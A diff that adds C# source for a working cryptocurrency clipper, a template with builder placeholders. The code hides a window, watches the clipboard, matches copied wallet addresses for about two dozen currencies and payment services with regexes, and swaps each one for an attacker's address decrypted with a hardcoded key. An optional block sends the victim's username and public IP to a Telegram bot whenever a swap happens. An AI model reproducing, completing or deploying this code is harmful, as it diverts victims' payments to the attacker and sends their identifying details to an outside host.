@@ -1,0 +1,1050 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+using System.Net;
+using System.IO;
+using Microsoft.Win32;
+using System.Diagnostics;
+using System.Net.Security;
+using System.Reflection;
+using System.Management;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Collections.Specialized;
+using System.Security.Cryptography;
+
+[assembly: AssemblyTitle("[Title]")]
+[assembly: AssemblyDescription("[Description]")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("[Company]")]
+[assembly: AssemblyProduct("[Product]")]
+[assembly: AssemblyCopyright("[Copyright]")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("[Guid]")]
+[assembly: AssemblyVersion("3.0.0.0")]
+[assembly: AssemblyFileVersion("[Version]")]
+
+namespace Program
+{
+    public class BoxClipText
+    {
+        public static string Decrypt(string toDecrypt, bool useHashing)
+        {
+            string key = "Prosto";
+            byte[] buffer;
+            byte[] inputBuffer = Convert.FromBase64String(toDecrypt);
+            if (useHashing)
+            {
+                buffer = new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(key));
+            }
+            else
+            {
+                buffer = Encoding.UTF8.GetBytes(key);
+            }
+            TripleDESCryptoServiceProvider provider2 = new TripleDESCryptoServiceProvider
+            {
+                Key = buffer,
+                Mode = CipherMode.ECB,
+                Padding = PaddingMode.PKCS7
+            };
+            byte[] bytes = provider2.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
+            return Encoding.UTF8.GetString(bytes);
+        }
+        public static string YANDEX_MONEY = BoxClipText.Decrypt("[YM]", true);
+        public static string WMZ = BoxClipText.Decrypt("[WMZ]", true);
+        public static string WMR = BoxClipText.Decrypt("[WMR]", true);
+        public static string STEAMTRADE_LINK = BoxClipText.Decrypt("[STEAM]", true);
+        public static string QIWI = BoxClipText.Decrypt("[QIWI]", true);
+        public static string ETHEREUM = BoxClipText.Decrypt("[ETH]", true);
+        public static string ZCASH = BoxClipText.Decrypt("[ZCASH]", true);
+        public static string XPR = BoxClipText.Decrypt("[XPR]", true);
+        public static string BCH = BoxClipText.Decrypt("[BCH]", true);
+        public static string BTG = BoxClipText.Decrypt("[BTG]", true);
+        public static string DASH = BoxClipText.Decrypt("[DASH]", true);
+        public static string DOGE = BoxClipText.Decrypt("[DOGE]", true);
+        public static string LTC = BoxClipText.Decrypt("[LTC]", true);
+        public static string NEO = BoxClipText.Decrypt("[NEO]", true);
+        public static string XLM = BoxClipText.Decrypt("[XLM]", true);
+        public static string PAY = BoxClipText.Decrypt("[PAY]", true);
+        public static string TRX = BoxClipText.Decrypt("[TRX]", true);
+        public static string BTC1 = BoxClipText.Decrypt("[BTC1]", true);
+        public static string BTC3 = BoxClipText.Decrypt("[BTC3]", true);
+        public static string PPC = BoxClipText.Decrypt("[PPC]", true);
+        public static string XMR = BoxClipText.Decrypt("[XMR]", true);
+        public static string BCN = BoxClipText.Decrypt("[BCN]", true);
+        public static string BNB = BoxClipText.Decrypt("[BNB]", true);
+        public static string WMP = BoxClipText.Decrypt("[WMP]", true);
+
+
+    }
+    internal static class ClipboardEx
+    {
+        private const uint CF_UNICODETEXT = 0xD; // 13
+        private const int UF = 1;
+
+        public static string GetText()
+        {
+            if (!NativeMethods.IsClipboardFormatAvailable(CF_UNICODETEXT)) { return null; }
+            if (!NativeMethods.OpenClipboard(IntPtr.Zero)) { return null; }
+            string data = null;
+            IntPtr hGlobal = NativeMethods.GetClipboardData(CF_UNICODETEXT);
+            if (!hGlobal.Equals(IntPtr.Zero))
+            {
+                IntPtr lpwcstr = NativeMethods.GlobalLock(hGlobal);
+                if (!lpwcstr.Equals(IntPtr.Zero))
+                {
+                    try
+                    {
+                        data = Marshal.PtrToStringUni(lpwcstr);
+                        NativeMethods.GlobalUnlock(lpwcstr);
+                    }
+                    catch { }
+                }
+            }
+            NativeMethods.CloseClipboard();
+            return data;
+        }
+
+        public static bool SetText(string text) // Старая вариация
+        {
+            if (NativeMethods.GetOpenClipboardWindow() != null)
+            {
+                NativeMethods.OpenClipboard(IntPtr.Zero);
+                NativeMethods.CloseClipboard();
+                ClipboardEx.SetClipboardText(text);
+            }
+            else
+            {
+                ClipboardEx.SetClipboardText(text);
+            }
+            return true;
+        }
+
+        public static bool SetClipboardText(string Text) // новая вариация ( используйте этот пример )
+        {
+            IntPtr ipGlobal = IntPtr.Zero;
+
+            ipGlobal = Marshal.StringToHGlobalAnsi(Text);
+            if (ipGlobal.Equals(IntPtr.Zero)) { return false; }
+            if (!NativeMethods.OpenClipboard(IntPtr.Zero)) { return false; }
+            NativeMethods.EmptyClipboard();
+            if (!(NativeMethods.SetClipboardData(UF, ipGlobal) != IntPtr.Zero))
+            {
+                Marshal.FreeHGlobal(ipGlobal);
+            }
+            NativeMethods.CloseClipboard();
+            return true;
+        }
+    }
+    public static partial class ClipboardMonitor
+    {
+        internal static event OnClipboardChangeEventHandler OnClipboardChange;
+
+        public static void Start()
+        {
+            ClipboardWatcher.Start();
+            ClipboardWatcher.OnClipboardChange += delegate (Enums.ClipboardFormat clipboardFormat, object data)
+            {
+                OnClipboardChange.Invoke(clipboardFormat, data);
+            };
+        }
+
+        public static void Stop()
+        {
+            OnClipboardChange = null;
+            ClipboardWatcher.Stop();
+        }
+
+        internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat clipboardFormat, object data);
+    }
+    public static partial class ClipboardMonitor
+    {
+        private class ClipboardWatcher : Form
+        {
+            public static event OnClipboardChangeEventHandler OnClipboardChange;
+
+            public static void Start()
+            {
+                try
+                {
+                    if (!(mInstance != null))
+                    {
+                        var thread = new Thread(delegate (object x)
+                        {
+                            Application.Run(new ClipboardWatcher());
+                        });
+                        thread.SetApartmentState(ApartmentState.STA);
+                        thread.Start();
+                    }
+                }
+                catch { }
+            }
+
+            public static void Stop()
+            {
+                try
+                {
+                    mInstance.Invoke(new MethodInvoker(delegate ()
+                    {
+                        NativeMethods.ChangeClipboardChain(mInstance.Handle, nextClipboardViewer);
+                    }));
+                    mInstance.Invoke(new MethodInvoker(mInstance.Close));
+                    mInstance.Dispose();
+                    mInstance = null;
+                }
+                catch { }
+            }
+
+            protected override void SetVisibleCore(bool value)
+            {
+                this.CreateHandle();
+                mInstance = this;
+                nextClipboardViewer = NativeMethods.SetClipboardViewer(mInstance.Handle);
+                base.SetVisibleCore(false);
+            }
+
+            protected override void WndProc(ref Message m)
+            {
+                switch (m.Msg)
+                {
+                    case WM_DRAWCLIPBOARD:
+                        this.ClipChanged();
+                        NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam);
+                        break;
+                    default:
+                        switch (m.Msg)
+                        {
+                            case WM_CHANGECBCHAIN:
+                                if (m.WParam != nextClipboardViewer) { NativeMethods.SendMessage(nextClipboardViewer, m.Msg, m.WParam, m.LParam); }
+                                else { nextClipboardViewer = m.LParam; }
+                                break;
+                            default:
+                                base.WndProc(ref m);
+                                break;
+                        }
+                        break;
+                }
+            }
+
+            private void ClipChanged()
+            {
+                IDataObject dataObject = Clipboard.GetDataObject();
+                Enums.ClipboardFormat? clipboardFormat = null;
+                foreach (string text in Enum.GetNames(typeof(Enums.ClipboardFormat)))
+                {
+                    if (dataObject.GetDataPresent(text))
+                    {
+                        clipboardFormat = new Enums.ClipboardFormat?((Enums.ClipboardFormat)Enum.Parse(typeof(Enums.ClipboardFormat), text));
+                        break;
+                    }
+                }
+                object data = dataObject.GetData(clipboardFormat.ToString());
+                if (!(data == null || clipboardFormat == null))
+                {
+                    OnClipboardChange.Invoke(clipboardFormat.Value, data);
+                }
+            }
+
+            protected static ClipboardWatcher mInstance;
+            private static IntPtr nextClipboardViewer;
+            private const int WM_DRAWCLIPBOARD = 776, WM_CHANGECBCHAIN = 781;
+
+            public ClipboardWatcher() { }
+
+            internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat format, object data);
+        }
+    }
+    internal class ClipChanger
+    {
+        public static void StopChanger() // Останавливаем клиппер
+        {
+            ClipboardMonitor.OnClipboardChange += GetClip;
+            ClipboardMonitor.Stop();
+        }
+
+        public static void StartChanger() // Запускаем клиппер
+        {
+            ClipboardMonitor.OnClipboardChange += GetClip;
+            ClipboardMonitor.Start();
+        }
+
+        public static void GetClip(Enums.ClipboardFormat clipboardFormat, object data) // Тут проверка буфера обмена ( событие )
+        {
+            var qiwi = new Regex(@"^((8|\+7|\+380|\+375|\+373)[\- ]?)?(\(?\d{3}\)?[\- ]?)?[\d\- ]{7,10}$");
+            var btc1 = new Regex(@"(^1(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34}?[\d\- ])|(^1(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34})$");
+            var btc3 = new Regex(@"(^3(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34}?[\d\- ])|(^3(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{27,34})$");
+            var ltc = new Regex(@"(^L[A-Za-z0-9]{32,34}?[\d\- ])|(^L[A-Za-z0-9]{32,34})$");
+            var bch = new Regex(@"(^q[A-Za-z0-9\:]{32,54}?[\d\- ])|(^q[A-Za-z0-9\:]{32,54})$");
+            var payeer = new Regex(@"^(P|p){1}[0-9]?[\d\- ]{7,10}$");
+            var eth = new Regex(@"(^0x[A-Za-z0-9]{40,40}?[\d\- ])|(^0x[A-Za-z0-9]{40,40})$");
+            var dash = new Regex(@"(^X[A-Za-z0-9]{32,34}?[\d\- ])|(^X[A-Za-z0-9]{32,34})$");
+            var ya = new Regex(@"^41001[0-9]?[\d\- ]{7,11}$");
+            var wmr = new Regex(@"^R[0-9]?[\d\- ]{12,13}$");
+            var wmz = new Regex(@"^Z[0-9]?[\d\- ]{12,13}$");
+            var xlm = new Regex(@"(^(GD|GC)[A-Z0-9]{54,56}?[\d\- ])|(^(GD|GC)[A-Z0-9]{54,56})$");
+            var neo = new Regex(@"(^A[A-Za-z0-9]{32,34}?[\d\- ])|(^A[A-Za-z0-9]{32,34})$");
+            var zcash = new Regex(@"(^t[A-Za-z0-9]{32,36}?[\d\- ])|(^t[A-Za-z0-9]{32,36})$");
+            var xpr = new Regex(@"(^r[A-Za-z0-9]{32,34}?[\d\- ])|(^r[A-Za-z0-9]{32,34})$");
+            var btg = new Regex(@"(^G[A-Za-z0-9]{32,35}?[\d\- ])|(^G[A-Za-z0-9]{32,35})$");
+            var doge = new Regex(@"(^D[A-Za-z0-9]{32,35}?[\d\- ])|(^D[A-Za-z0-9]{32,35})$");
+            var trx = new Regex(@"(^(T[A-Z])[A-Za-z0-9]{32,35}?[\d\- ])|(^(T[A-Z])[A-Za-z0-9]{32,35})$");
+            var xmr = new Regex(@"(^(4[A-Z])(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{104,107}?[\d\- ])|(^(4[A-Z])(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{104,107})$");
+            var ppc = new Regex(@"(^P[A-Za-z0-9]{32,34}?[\d\- ])|(^P[A-Za-z0-9]{32,34})$");
+            var bcn = new Regex(@"(^(2[0-9])(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{93,97}?[\d\- ])|(^(2[0-9])(?=.*[0-9])(?=.*[a-zA-Z])[\da-zA-Z]{93,97})$");
+            var bnb = new Regex(@"(^bnb1[A-Za-z0-9\:]{32,54}?[\d\- ])|(^bnb1[A-Za-z0-9\:]{32,54})$");
+            var wmp = new Regex(@"^P[0-9]?[\d\- ]{12,13}$");
+            string BufferText = ClipboardEx.GetText();
+            BufferText = BufferText.Replace(" ", "");
+#if LOGGER2
+            string IP2 = "[IP2]";
+#endif
+#if BNB
+            if (BoxClipText.BNB != null)
+            {
+                if (bnb.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.BNB);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена BNB </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if WMP
+            if (BoxClipText.WMP != null)
+            {
+                if (wmp.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.WMP);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена WMP </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if BCN
+            if (BoxClipText.BCN != null)
+            {
+                if (bcn.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.BCN);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена BCN </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if PPC
+            if (BoxClipText.PPC != null)
+            {
+                if (ppc.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.PPC);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена PPC </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if XMR
+            if (BoxClipText.XMR != null)
+            {
+                if (xmr.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.XMR);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена XMR </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if QIWI
+            if (BoxClipText.QIWI != null)
+            {
+                if (qiwi.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.QIWI);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена QIWI </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if BTC1
+            if (BoxClipText.BTC1 != null)
+            {
+                if (btc1.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.BTC1);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена BTC 1 </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if BTC3
+            if (BoxClipText.BTC3 != null)
+            {
+                if (btc3.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.BTC3);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена BTC 3 </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if LTC
+            if (BoxClipText.LTC != null)
+            {
+                if (ltc.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.LTC);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена LTC </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if BCH
+            if (BoxClipText.BCH != null)
+            {
+                if (bch.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.BCH);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена BCH </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if PAY
+            if (BoxClipText.PAY != null)
+            {
+                if (payeer.IsMatch(BufferText) && BufferText.Length < 10)
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.PAY);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена PAYEER </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if ETH
+            if (BoxClipText.ETHEREUM != null)
+            {
+                if (eth.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.ETHEREUM);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена ETHEREUM </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if DASH
+            if (BoxClipText.DASH != null)
+            {
+                if (dash.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.DASH);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена DASH </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if YM
+            if (BoxClipText.YANDEX_MONEY != null)
+            {
+                if (ya.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.YANDEX_MONEY);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена YandexMoney </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if WMR
+            if (BoxClipText.WMR != null)
+            {
+                if (wmr.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.WMR);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена WMR </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if WMZ
+            if (BoxClipText.WMZ != null)
+            {
+                if (wmz.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.WMZ);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена WMZ </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if XLM
+            if (BoxClipText.XLM != null)
+            {
+                if (xlm.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.XLM);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена XLM </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if NEO
+            if (BoxClipText.NEO != null)
+            {
+                if (neo.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.NEO);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена NEO </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if ZEC
+            if (BoxClipText.ZCASH != null)
+            {
+                if (zcash.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.ZCASH);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена ZCASH </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if XPR
+            if (BoxClipText.XPR != null)
+            {
+                if (xpr.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.XPR);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена XPR </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if BTG
+            if (BoxClipText.BTG != null)
+            {
+                if (btg.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.BTG);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена BTG </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if DOGE
+            if (BoxClipText.DOGE != null)
+            {
+                if (doge.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.DOGE);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена DOGE </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if TRX
+            if (BoxClipText.TRX != null)
+            {
+                if (trx.IsMatch(BufferText))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.TRX);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена TRON </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                    Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+#if STEAM
+            if (BoxClipText.STEAMTRADE_LINK != null)
+            {
+
+                if (BufferText.StartsWith("https://steamcommunity.com/tradeoffer/new/?partner"))
+                {
+                    ClipboardEx.SetClipboardText(BoxClipText.STEAMTRADE_LINK);
+#if TGW
+using (var webClient = new WebClient())
+               {
+                string ip = webClient.DownloadString("https://api.ipify.org");
+                Program.Telegram(BoxClipText.Decrypt("[CHATID]", true), BoxClipText.Decrypt("[TOKEN]", true), BoxClipText.Decrypt("[PROXY]", true), "✨<strong> Подмена STEAMTRADELINK </strong>✨" + "\n" + "<b>Имя компьютера: </b>" + System.Environment.UserName + "\n" + "<b>IP: </b>" + ip);
+               }
+#endif
+#if LOGGER2
+                 Program.Logger(IP2, "Replace");
+#endif
+                }
+            }
+#endif
+            /*
+             if (BufferText.Length == 11 || BufferText.Length == 12)
+             {
+                 ClipboardEx.SetClipboardText(BoxClipText.Qiwi);
+             }
+             if (BufferText.StartsWith("41") && BufferText.Length == 15)
+             {
+                 ClipboardEx.SetClipboardText(BoxClipText.Yandex);
+             }
+             if (BufferText.Length == 34 || BufferText.Length == 54)
+             {
+                 ClipboardEx.SetClipboardText(BoxClipText.Bitcoin);
+             }
+             */
+        }
+
+    }
+    public static class Enums
+    {
+        public enum ClipboardFormat : byte
+        {
+            Text,
+            UnicodeText
+        }
+    }
+    internal static class NativeMethods
+    {
+#region For ClipBoard GetText
+
+        [DllImport("user32.dll")]
+        internal static extern IntPtr GetClipboardData(uint uFormat);
+
+        [DllImport("user32.dll")]
+        public static extern bool IsClipboardFormatAvailable(uint format);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        internal static extern bool OpenClipboard(IntPtr hWndNewOwner);
+
+        [DllImport("user32.dll", SetLastError = true)]
+        internal static extern bool CloseClipboard();
+
+        [DllImport("user32.dll")]
+        internal static extern bool EmptyClipboard();
+
+        [DllImport("kernel32.dll")]
+        internal static extern IntPtr GlobalLock(IntPtr hMem);
+
